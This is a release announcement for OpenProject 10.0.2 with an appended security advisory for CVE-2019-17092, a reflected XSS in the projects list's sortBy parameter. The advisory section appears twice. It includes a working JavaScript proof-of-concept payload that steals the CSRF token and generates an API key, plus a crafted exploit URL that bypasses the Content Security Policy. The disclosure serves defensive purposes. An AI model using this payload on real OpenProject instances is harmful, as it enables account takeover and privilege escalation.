# OpenProject 10.0.2

We released [OpenProject 10.0.2](https://community.openproject.org/versions/1395). The release contains a security related fix and we urge updating to the newest version.

## [CVE-2019-17092] XSS injection vulnerability in projects listing in versions before 9.0.4, 10.0.2

An XSS vulnerability in project list in OpenProject before 9.0.4 and 10.x before 10.0.2 allows remote attackers to inject arbitrary web script or HTML via the sortBy parameter because error messages are mishandled.

This vulnerability has been assigned the CVE identifier CVE-2019-17092.

Versions Affected: Versions <= 9.0.3, 10.0.1 Fixed Versions: 9.0.4, 10.0.2

### Credits

Thanks to David Haintz from the SEC Consult Vulnerability Lab (<https://www.sec-consult.com>) for identifying and responsibly disclosing the identified issues.

## Incorrect setting results in slow application and RAM usage

The environment variable *WEB\_CONCURRENCY* has been used by OpenProject for some time to control the number of web workers to be spawned by the Unicorn application server. It is defaulting to 4 workers which should account to around 1 - 1.2GB of RAM usage.

In the upgrade to OpenProject 10, a buildpack from Heroku was updated to control the packaging of the frontend and its assets (our Angular frontend), which appears to be using the same variable for setting internal workers that are unrelated to our setup. This has resulted in the *WEB\_CONCURRENCY* value to be set to a number that would exhaust many servers being set up for OpenProject and in turn resulting in bad performance of OpenProject and any other service.

This has been fixed in this release. We now use the environment variable *OPENPROJECT\_WEB\_WORKERS* to control the same setting. If you previously set *WEB\_CONCURRENCY* in your application to a lower or higher number, please also set the *OPENPROJECT\_WEB\_WORKERS* variable to the same value.

## Other bug fixes and changes

* Fixed: Inconsistent row heights when resizing widgets [[#31048](https://community.openproject.org/wp/31048)]
* Fixed: In Budgets projected unit costs and labor cost is not shown [[#31247](https://community.openproject.org/wp/31247)]
* Fixed: Restart puma workers to cope with potential memory leaks [[#31262](https://community.openproject.org/wp/31262)]
* Fixed: âEnterprise editionâ blue bar would be nicer horizontally [[#31265](https://community.openproject.org/wp/31265)]

Vendor description:
-------------------
"OpenProject is the leading open source project management software. Support your
project management process along the entire project life cycle: From project
initiation to closure."

Source: <https://www.openproject.org/>

Business recommendation:
------------------------
Update to the latest version of OpenProject.

An in-depth security analysis performed by security professionals is
highly advised, as the software may be affected from further security issues.

Vulnerability overview/description:
-----------------------------------
1) Reflected XSS vulnerability (CVE-2019-17092)
The project list of OpenProject lacks input validation on data that is output inside
an error message. Due to the Content Security Policy inline scripts/styles weren't
allowed and the script source was limited to 'self'. To bypass this a JavaScript file
was added as attachment to an existing project. This could be used to extract the CSRF
token and create a new API key.

Proof of concept:
-----------------
1) Reflected XSS vulnerability (CVE-2019-17092)
Within this proof of concept, two steps are done. First the JavaScript code to be
executed is uploaded as an attachment to fulfill the Content Security Policy of
'self'. In the second step the uploaded JavaScript code is executed through the
reflected XSS vulnerability by using a script-tag.

a) Upload JavaScript code
An attacker can upload a JavaScript file as attachment into any project in the default
configuration. The attachment can be called directly, but will be downloaded
automatically. But since the browser doesn't care if a file shall be downloaded or
displayed when loading it from an src-property, an attacker can easily use it for the
reflected XSS vulnerability.

In this proof of concept the following JavaScript code was uploaded:

(async () => {
        var csrf_param = document.querySelector('meta[name=csrf-param]').content;
        var csrf_token = document.querySelector('meta[name=csrf-token]').content;

        var req = await fetch("[http://$IP/my/generate_api_key"](http://$IP/my/generate_api_key%22);, {
            "credentials": "include",
            "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
            "Content-Type": "application/x-www-form-urlencoded",
            "Upgrade-Insecure-Requests": "1"
        },
        "referrer": "[http://$IP/my/access_token"](http://$IP/my/access_token%22);,
        "body": "_method=post&" + csrf_param + "=" + encodeURI(csrf_token),
        "method": "POST",
        "mode": "cors"
        });

        var resp = await req.text();

        var regex = /(Your access token is:\<br \/\>\<strong\>)(.*)(\<\/strong\>)/gm;
        var api_key = resp.match(regex)[0];
        api_key = api_key.slice(35, -9);
        alert("Generated new API key: " + api_key);
})();

This gets the CSRF token and the parameter name (since this seems to be configurable)
and sends a request to the generate_api_key functionality. After parsing, the key is
exposed in a message box, but can be used for further operations like adding an
administrative user.

b) Craft link
The reflected XSS vulnerability was found in the URL parameter 'sortBy' of the path
'/projects'. There an attacker may add any HTML code.

Such a link could be:
<http://$IP/projects?sortBy=[[%22%3E%3Cscript%20src=%27/attachments/29/test.js%27%3E%3C%2Fscript%3E%22%2C%22%22>]]

Vulnerable / tested versions:
-----------------------------
The following version has been tested which was the latest version available at the
time of the test:

* 10.0.0
* 10.0.1

According to the vendor, all versions before v9.0.3 and v10.0.1 are affected.

Vendor contact timeline:
------------------------
2019-10-02: Contacting vendor through security () openproject com
2019-10-02: Vendor verified the vulnerability and released the fix
2019-10-08: Verified fixed vulnerability
2019-10-08: Vendor announced that they will publish the CVE and full advisory
2019-10-14: Release of security advisory.

Vendor description:
-------------------
"OpenProject is the leading open source project management software. Support your
project management process along the entire project life cycle: From project
initiation to closure."

Source: <https://www.openproject.org/>

Business recommendation:
------------------------
Update to the latest version of OpenProject.

An in-depth security analysis performed by security professionals is
highly advised, as the software may be affected from further security issues.

Vulnerability overview/description:
-----------------------------------
1) Reflected XSS vulnerability (CVE-2019-17092)
The project list of OpenProject lacks input validation on data that is output inside
an error message. Due to the Content Security Policy inline scripts/styles weren't
allowed and the script source was limited to 'self'. To bypass this a JavaScript file
was added as attachment to an existing project. This could be used to extract the CSRF
token and create a new API key.

Proof of concept:
-----------------
1) Reflected XSS vulnerability (CVE-2019-17092)
Within this proof of concept, two steps are done. First the JavaScript code to be
executed is uploaded as an attachment to fulfill the Content Security Policy of
'self'. In the second step the uploaded JavaScript code is executed through the
reflected XSS vulnerability by using a script-tag.

a) Upload JavaScript code
An attacker can upload a JavaScript file as attachment into any project in the default
configuration. The attachment can be called directly, but will be downloaded
automatically. But since the browser doesn't care if a file shall be downloaded or
displayed when loading it from an src-property, an attacker can easily use it for the
reflected XSS vulnerability.

In this proof of concept the following JavaScript code was uploaded:

(async () => {
        var csrf_param = document.querySelector('meta[name=csrf-param]').content;
        var csrf_token = document.querySelector('meta[name=csrf-token]').content;

        var req = await fetch("[http://$IP/my/generate_api_key"](http://$IP/my/generate_api_key%22);, {
            "credentials": "include",
            "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
            "Content-Type": "application/x-www-form-urlencoded",
            "Upgrade-Insecure-Requests": "1"
        },
        "referrer": "[http://$IP/my/access_token"](http://$IP/my/access_token%22);,
        "body": "_method=post&" + csrf_param + "=" + encodeURI(csrf_token),
        "method": "POST",
        "mode": "cors"
        });

        var resp = await req.text();

        var regex = /(Your access token is:\<br \/\>\<strong\>)(.*)(\<\/strong\>)/gm;
        var api_key = resp.match(regex)[0];
        api_key = api_key.slice(35, -9);
        alert("Generated new API key: " + api_key);
})();

This gets the CSRF token and the parameter name (since this seems to be configurable)
and sends a request to the generate_api_key functionality. After parsing, the key is
exposed in a message box, but can be used for further operations like adding an
administrative user.

b) Craft link
The reflected XSS vulnerability was found in the URL parameter 'sortBy' of the path
'/projects'. There an attacker may add any HTML code.

Such a link could be:
<http://$IP/projects?sortBy=[[%22%3E%3Cscript%20src=%27/attachments/29/test.js%27%3E%3C%2Fscript%3E%22%2C%22%22>]]

Vulnerable / tested versions:
-----------------------------
The following version has been tested which was the latest version available at the
time of the test:

* 10.0.0
* 10.0.1

According to the vendor, all versions before v9.0.3 and v10.0.1 are affected.
